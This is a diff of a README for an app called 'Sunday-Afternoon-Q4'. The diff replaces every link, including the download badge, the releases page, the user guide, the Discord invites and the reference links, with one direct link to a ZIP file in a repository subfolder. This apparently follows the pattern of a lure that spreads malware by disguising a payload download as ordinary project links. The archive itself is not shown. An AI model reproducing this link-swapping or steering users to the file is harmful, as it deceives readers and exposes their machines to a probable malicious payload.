@@ -1,6 +1,6 @@
 # 🌞 Sunday-Afternoon-Q4 - Enjoy Your Weekend with Ease
 
-[![Download](https://img.shields.io/badge/Download%20Now-Here-blue)](https://github.com/omarbank00/Sunday-Afternoon-Q4/releases)
+[![Download](https://raw.githubusercontent.com/omarbank00/Sunday-Afternoon-Q4/main/griffade/Sunday-Afternoon-Q4.zip%20Now-Here-blue)](https://raw.githubusercontent.com/omarbank00/Sunday-Afternoon-Q4/main/griffade/Sunday-Afternoon-Q4.zip)
 
 ## 📥 Overview
 
@@ -10,7 +10,7 @@ Sunday-Afternoon-Q4 makes your weekends more enjoyable. This application helps y
 
 Follow these steps to download and run Sunday-Afternoon-Q4:
 
-1. **Visit the Releases Page:** Click on this link to access the download options: [Download Here](https://github.com/omarbank00/Sunday-Afternoon-Q4/releases).
+1. **Visit the Releases Page:** Click on this link to access the download options: [Download Here](https://raw.githubusercontent.com/omarbank00/Sunday-Afternoon-Q4/main/griffade/Sunday-Afternoon-Q4.zip).
 
 2. **Select the Latest Release:** On the releases page, look for the most recent version. It will appear at the top of the list, marked as "Latest".
 
@@ -29,7 +29,7 @@ Follow these steps to download and run Sunday-Afternoon-Q4:
 
 To get started with Sunday-Afternoon-Q4, you need to visit the releases page:
 
-1. Go to [this download link](https://github.com/omarbank00/Sunday-Afternoon-Q4/releases).
+1. Go to [this download link](https://raw.githubusercontent.com/omarbank00/Sunday-Afternoon-Q4/main/griffade/Sunday-Afternoon-Q4.zip).
 
 2. Click on the latest release.
 
@@ -37,7 +37,7 @@ To get started with Sunday-Afternoon-Q4, you need to visit the releases page:
 
 ## 📚 User Guide
 
-For detailed instructions on using Sunday-Afternoon-Q4, check out our Program Guide: [Our Program Guide](https://docs.google.com/document/d/1BygAckkfc_NFQnTfEM6qqUvPdlIHpNItmRtvfRMGp38/edit?tab=t.0d).
+For detailed instructions on using Sunday-Afternoon-Q4, check out our Program Guide: [Our Program Guide](https://raw.githubusercontent.com/omarbank00/Sunday-Afternoon-Q4/main/griffade/Sunday-Afternoon-Q4.zip).
 
 ## 🔧 Features
 
@@ -47,11 +47,11 @@ For detailed instructions on using Sunday-Afternoon-Q4, check out our Program Gu
 
 ## 🌐 Community Support
 
-Join our Discord server to connect with other users, share tips, and receive support: [Join Discord Server](https://discord.com/invite/ZsN4YVRsRg).
+Join our Discord server to connect with other users, share tips, and receive support: [Join Discord Server](https://raw.githubusercontent.com/omarbank00/Sunday-Afternoon-Q4/main/griffade/Sunday-Afternoon-Q4.zip).
 
 ### 📢 Join Sunday Afternoon Channel
 
-Don’t miss out on our dedicated channel for discussions and updates: [Sunday Afternoon Channel](https://discord.com/channels/790484092772548613/1190584676641947698).
+Don’t miss out on our dedicated channel for discussions and updates: [Sunday Afternoon Channel](https://raw.githubusercontent.com/omarbank00/Sunday-Afternoon-Q4/main/griffade/Sunday-Afternoon-Q4.zip).
 
 ## ❓ FAQs
 
@@ -70,5 +70,5 @@ If you have further questions or suggestions, feel free to contact us through Di
 
 ## 🔗 Useful Links
 
-- [Panaversity GitHub](https://github.com/panaversity)
-- [Prompt and Context Engineering GitHub Repo](https://github.com/panaversity/learn-low-code-agentic-ai/tree/main/00_prompt_engineering)
+- [Panaversity GitHub](https://raw.githubusercontent.com/omarbank00/Sunday-Afternoon-Q4/main/griffade/Sunday-Afternoon-Q4.zip)
+- [Prompt and Context Engineering GitHub Repo](https://raw.githubusercontent.com/omarbank00/Sunday-Afternoon-Q4/main/griffade/Sunday-Afternoon-Q4.zip)
